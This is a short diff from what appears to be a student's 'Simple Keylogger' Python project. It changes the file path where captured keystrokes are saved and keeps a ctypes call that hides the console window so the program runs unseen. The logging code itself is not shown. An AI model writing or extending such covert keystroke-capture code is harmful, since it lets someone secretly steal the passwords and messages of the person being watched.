@@ -6,7 +6,7 @@ import ctypes
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 # File path to store the keylogs
-file_path = r"C:\Users\rushi\OneDrive\Desktop\Prodigy\Simple_Keylogger\output.txt"
+file_path = r"C:\Users\Nehaam Khan\Downloads\Keylogger\output.txt"
 
 # Function to handle key events
 def on_key_event(event):
